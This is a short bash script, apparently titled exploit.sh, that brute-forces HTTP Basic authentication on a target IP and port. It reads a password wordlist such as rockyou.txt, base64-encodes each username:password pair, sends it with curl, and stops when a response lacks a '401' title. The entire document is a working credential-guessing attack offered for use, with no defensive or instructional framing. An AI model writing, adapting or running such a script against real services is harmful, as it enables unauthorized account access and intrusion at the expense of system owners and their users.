#!/bin/bash
# this script was written by ZWERD
ip=$1
port=$2
wordlist=$3
username=$4
# How to run the script:
[ $# -eq 0 ] && { echo "Usage: ./exploit.sh [IP] [PORT] [WORDLIST] [USERNAME]";
	echo "Example ./exploit.sh 192.168.1.10 80 rockyou.txt"; exit 1; }
lines=$(cat $wordlist|nl|tail -n1|cut -f1)
for loop in $(seq 0 $lines);
do
  pass=$(tail $wordlist -n $(expr $lines - $loop) | head -n 1)
  echo "Testing: $username:$pass";
  auth=$(echo -n $username:$pass|base64); 
  code=$(curl -s -X GET "http://$ip:$port/" -H "Authorization: Basic $auth" |grep title)
if [[ "$code" != *"401"* ]];
then
  echo "Found pass: $username:$pass"
  break
fi
done 
